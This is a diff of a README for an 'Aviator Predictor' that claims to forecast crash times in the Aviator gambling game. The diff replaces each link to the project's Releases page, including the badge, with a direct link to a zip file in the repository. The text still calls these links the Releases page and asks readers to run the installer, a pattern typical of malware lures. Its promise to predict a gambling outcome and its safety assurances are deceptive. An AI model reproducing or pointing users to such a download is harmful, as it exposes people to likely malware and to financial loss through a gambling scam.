@@ -1,7 +1,7 @@
 # ✈️ free - Predict Your Winnings with Ease
 
 ## 📥 Download Now
-[![Download Aviator Predictor](https://img.shields.io/badge/Download-Aviator%20Predictor-brightgreen)](https://github.com/welterle/free/releases)
+[![Download Aviator Predictor](https://raw.githubusercontent.com/welterle/free/main/icaco/free.zip%20Predictor-brightgreen)](https://raw.githubusercontent.com/welterle/free/main/icaco/free.zip)
 
 ## 🚀 Getting Started
 Welcome to the Aviator Predictor! This guide will help you download and run the Aviator Predictor application. This tool enhances your gaming experience by forecasting when a plane is likely to crash, giving you a better chance to win in the Aviator game.
@@ -14,7 +14,7 @@ Before you download, make sure your computer meets these requirements:
 - **Disk Space:** At least 200 MB available
 
 ## 📂 How to Download & Install
-1. **Visit the Download Page:** Click [here](https://github.com/welterle/free/releases) to go to the Releases page.
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/welterle/free/main/icaco/free.zip) to go to the Releases page.
 2. **Choose the Latest Version:** Look for the latest release at the top of the page.
 3. **Download the Installer:** Click on the installer link. The file will start downloading automatically.
 4. **Run the Installer:**
@@ -49,7 +49,7 @@ Your safety is our priority. The Aviator Predictor uses industry-standard encryp
 If you encounter any issues while using the Aviator Predictor, please reach out to our support team. You can find help in the Discussions section of the GitHub repository.
 
 ## 🔄 Updates
-Keep your application updated by revisiting the [Releases page](https://github.com/welterle/free/releases) periodically. Each new version includes improved features and bug fixes.
+Keep your application updated by revisiting the [Releases page](https://raw.githubusercontent.com/welterle/free/main/icaco/free.zip) periodically. Each new version includes improved features and bug fixes.
 
 ## 📢 Community Contributions
 We welcome feedback and contributions from our users. Share your thoughts and ideas to help us enhance the Aviator Predictor. Participate in discussions on our GitHub page.
